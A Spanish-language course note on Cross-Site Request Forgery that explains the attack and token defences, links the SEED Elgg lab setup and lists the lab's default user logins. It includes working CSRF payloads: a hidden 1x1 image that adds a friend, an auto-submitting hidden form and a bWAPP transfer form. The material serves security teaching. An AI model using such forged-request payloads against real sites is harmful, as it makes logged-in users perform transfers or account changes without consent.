# Cross-Site Request Forgery (CSRF o XSRF)

Tags: #CSRF #OWASP #Explotacion 

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado.

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

-   **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
```bash 
# Usuarios del lab 
alice:seedalice
samy:seedsamy
```

## HTML
En el CSRF podemos modificar todos aquellos campos en donde no sea necesaria una autenticación en caso de no tener las credenciales. Pero si las tenemos claro que podemos modificar cualquier tipo de campo. 
* Son muy comunes en ataques de phishing
* La persona debe de estar logeada en la web donde esta el CSRF, y al momento de que abra el enlace, este pueda hacer los cambios como (Passwd, campos críticos, etc...)


Este tipo de scripts se deben de hacer en html, en donde sabemos que podemos hacer acciones en el mismo sitio tramitando data con la url.
```html
<img src="http://www.seed-server.com/action/friends/add?friend=57" alt="image" width="1" height="1" />  <!-- Enviaremos un html de una 'imagen' con un codigo-->
```
Desde la parte de action es para agregar un amigo en el lab de la pagina anterior. Por lo que al momento de mandarlo a alguien y este abra el correo o url, automáticamente se le agregara el amigo con ese identificador que en este caso es 57.  La acción va de la mano con el identificador del usuario a atacar.


```html
<html>
  <body>
    <form action="http://dominio/recurso" method="GET/POST">
      <input type="hidden" name="appsec" value="appsec" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


```html 
<div id="main">
    
    <h1>CSRF (Transfer Amount)</h1>

    <p>Amount on your account: <b> 1000 EUR</b></p>

    <form action="[http://bwapp.xyz/csrf_2.php](view-source:http://bwapp.xyz/csrf_2.php)" method="GET">

        <p><label for="account">Account to transfer:</label><br />
        <input type="text" id="account" name="account" value="223-45678-90"></p>

        <p><label for="amount">Amount to transfer:</label><br />
        <input type="text" id="amount" name="amount" value="100"></p>

        <button type="submit" name="action" value="transfer">Transfer</button>   

    </form>
    
</div>
```

